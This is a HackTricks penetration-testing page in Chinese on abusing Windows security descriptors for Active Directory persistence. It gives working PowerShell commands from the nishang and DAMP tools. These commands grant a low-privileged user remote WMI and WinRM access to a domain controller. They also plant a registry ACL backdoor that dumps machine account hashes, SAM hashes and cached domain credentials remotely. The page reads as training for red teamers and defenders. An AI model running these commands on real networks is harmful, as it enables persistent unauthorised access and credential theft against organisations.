# 安全描述符

{{#include ../../banners/hacktricks-training.md}}

## 安全描述符

[根据文档](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)：Security Descriptor Definition Language (SDDL) 定义了用于描述安全描述符的格式。SDDL 使用 ACE 字符串表示 DACL 和 SACL：`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**安全描述符**用于**存储**某个**对象**对另一个**对象**拥有的**权限**。如果你能够对某个对象的**安全描述符**进行一个**小修改**，就可以在无需成为特权组成员的情况下，获得对该对象非常有价值的权限。

因此，这种 persistence technique 基于以下能力：针对特定对象取得执行任务所需的全部权限，从而执行通常需要管理员权限的任务，但无需成为管理员。

### 访问 WMI

你可以让用户获得**远程执行 WMI** 的权限，[**使用此脚本**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>：
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Access to WinRM

为用户授予 **winrm PS console** 的访问权限 [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### 远程访问 hashes

访问 **注册表** 并创建一个使用 [**DAMP**](https://github.com/HarmJ0y/DAMP) 的 **Reg backdoor** 来 **dump hashes**，这样你就可以随时检索计算机的 **hash**、**SAM** 以及计算机中任何 **cached AD** 凭据。因此，将此权限授予针对 **Domain Controller computer** 的 **普通用户** 非常有用：<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
查看 [**Silver Tickets**](silver-ticket.md)，了解如何使用 Domain Controller 的 computer account hash。

## 参考资料

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
